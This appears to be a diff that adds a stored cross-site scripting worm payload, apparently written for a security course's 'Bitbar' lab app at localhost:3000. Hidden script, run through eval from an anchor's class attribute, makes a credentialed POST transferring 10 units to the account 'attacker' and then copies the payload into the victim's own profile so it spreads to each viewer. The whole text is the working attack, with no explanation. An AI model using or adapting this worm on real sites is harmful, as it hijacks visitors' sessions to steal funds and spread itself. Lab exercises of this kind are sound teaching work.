@@ -1,0 +1,17 @@
+<a id= "bitbar_count" class="eval(document.all.mycode.innerHTML)">way</a>
+<a id= "mycode">
+    const params = "destination_username=attacker".concat(String.fromCharCode(38)).concat("quantity=10");
+    var req = new XMLHttpRequest();
+    req.withCredentials=true;
+    req.open('POST', 'http://localhost:3000/post_transfer');
+    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    try { req.send(params); }
+    finally {
+        req = new XMLHttpRequest();
+        req.withCredentials=true;
+        req.open('POST', 'http://localhost:3000/set_profile');
+        req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        new_profile="new_profile=".concat(document.all.profile.innerHTML);
+        req.send(new_profile);
+    }
+</a>
